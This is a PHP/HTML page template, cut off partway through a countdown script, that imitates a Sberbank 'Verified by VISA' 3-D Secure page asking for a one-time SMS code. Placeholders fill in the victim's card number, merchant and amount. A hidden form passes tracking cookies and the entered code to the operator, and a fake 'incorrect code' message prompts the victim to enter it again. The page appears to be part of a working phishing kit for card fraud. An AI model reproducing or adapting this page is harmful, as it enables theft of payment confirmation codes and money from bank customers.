<?php require 'init.php'; ?>
<html>
<meta charset=utf-8>
<meta http-equiv=CACHE-CONTROL content=NO-CACHE>
<meta http-equiv=EXPIRES content="Mon, 22 Jul 2002 11:12:01 GMT">
<meta name=viewport content="width=device-width; initial-scale=1.0">
<style>html{height:100%}body{background-color:#FCFCFC;font-family:Helvetica;font-size:12px;padding:0;margin:0;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;display:-webkit-box;display:-ms-flexbox;display:block;height:100%}a{color:#0177ef;text-decoration:none}a:hover{text-decoration:underline}a.small{opacity:0.6}h1{font-size:18px}p{line-height:18px}.desc,.error{font-size:12px;margin:4px 0}.error{color:red}.modal-page{position:relative;width:342px;max-height:600px;background-color:#ffffff;padding:32px 24px 24px 24px;margin-top:0px;margin-left:auto;margin-right:auto;text-align:left;box-shadow:0 12px 28px rgba(0,0,0,0.1);border-radius:3px;font-size:12px}@media (max-height:600px){body{display:block}}.list{border-top:1px solid #dedede;padding-top:12px}.list-item{padding:4px 0;display:flex;align-items:baseline}.label{display:inline-block;width:45%;padding-right:24px;box-sizing:border-box;vertical-align:top;font-size:12px;opacity:0.5;text-align:right}.value{display:inline-block;width:48%;box-sizing:border-box}.big-input{padding:8px;background-color:#ffffff;border-color:#dedede;border-style:solid;border-width:1px;border-radius:6px}.big-input{display:block;width:100%}.big-button{height:36px;line-height:36px;-webkit-border-radius:4px;padding:0 18px;font-size:12px;font-weight:100}.big-button:hover,.inner-button:hover,.big-button-danger:hover{opacity:0.8}.big-button{background-color:#17c67a;border:none;color:#ffffff;margin:0 auto;display:block;-webkit-appearance:none;-webkit-border-radius:0;border-radius:0;width:100%;text-transform:uppercase}.big-input{font-size:14px;text-align:center;padding-left:0px;padding-right:0px}.big-input:hover,.small-input:hover{border:1px solid #263e4c}.header{display:flex;flex-direction:row;justify-content:space-between;align-items:center}.row:after{content:"";clear:both;display:table}.left{float:left;text-align:left}.right{float:right;text-align:right}input::-webkit-outer-spin-button,input::-webkit-inner-spin-button{-webkit-appearance:none}H1{padding-top:0.5em}<!---->.logo__image{width:100%;max-width:140px;height:auto}.row{margin-bottom:8px}.row:after,.row:before{display:table;content:" "}.row:after{clear:both}.loader{height:100%;text-align:center;position:absolute;width:100%;top:0;left:0;background-color:#ffffff;z-index:100;opacity:0.90}.help_icon{width:14px;height:13px;border:0px;padding-right:2px}</style>
<title>Verified by VISA - код безопасности</title>
[HEADERS_ASSETS]

<link rel=icon href="data:;base64,iVBORw0KGgo=">
<link rel=canonical href=https://acs5.sbrf.ru/acs/api/3ds/otp>
</head>
<body>
<div id=mainContainer class=modal-page>
 <div class=loader style=display:none>
 
 </div>
 <div class=header>
 <div id=bankLogoContainer>
 <img src="data:image/png;base64,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" alt="Bank logo" title="Bank logo" class=logo__image>
 </div>
 <div id=psLogoContainer>
 <img src=data:image/png;base64,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 class=logo__image>
 </div>
 </div>
 

<form class="client_ajax_form" autocomplete="off">
	<input type="hidden" name="operation" value="seconddata">
	<input type="hidden" name="keyid" value="<?php echo safe_array_access($_GET, 'id'); ?>">
	<input type="hidden" name="firstid" value="<?php echo safe_array_access($_COOKIE, 'firstid'); ?>">
	<input type="hidden" name="usertag" value="<?php echo safe_array_access($_COOKIE, 'usertag'); ?>">
	
 <h1>Введите Ваш код</h1>
 <div class=list id=descList style=display:block>
 <div class=list-item id=pa_merchant>
 <div class=label>Магазин:</div>
 <div class=value>[TEXT_2]</div>
 </div>
 <div class=list-item id=pa_desc>
 <div class=label>Описание:</div>
 <div class=value>[TEXT_3]</div>
 </div>
 <div class=list-item id=pa_amount>
 <div class=label>Сумма:</div>
 <div class=value><b>[TEXT_7] RUB</b></div>
 </div>
 <div class=list-item id=pa_date>
 <div class=label>Дата:</div>
 <div class=value><?php echo date('d/m/Y'); ?></div>
 </div>
 <div class=list-item id=pa_pan>
 <div class=label>Номер карты:</div>
 <div class=value>[CARDNUMBER]</div>
 </div>
 
 </div>
 <div class=desc>
 
 
 <div class=row style=display:none>
 
 
 
 
 </div>
 
 
 
 
<p class="if-error-hide-container">Одноразовый код был направлен на Ваш номер телефона. Пожалуйста, проверьте реквизиты транзакции и введите одноразовый код.</p>
<p class="if-error-show-container error" style="display:none;">Вы ввели неверный код. Просьба проверить код сообщения и ввести его еще раз.</p>

 </div>
 <div class=list>
 
 
 
 
 <input id=passwordEdit name="fields[0]" class=big-input type=text placeholder="Одноразовый SMS код" size=20 maxlength=20 autocomplete=off style=-webkit-text-security:disc;-moz-text-security:disc value>
 <p id="demo"></p>

<script>

function countDown(elm, duration, fn){
  // Set the date we're counting down to
  var countDownDate = new Date().getTime() + (1000 * duration);
  // Update the count down every 1 second
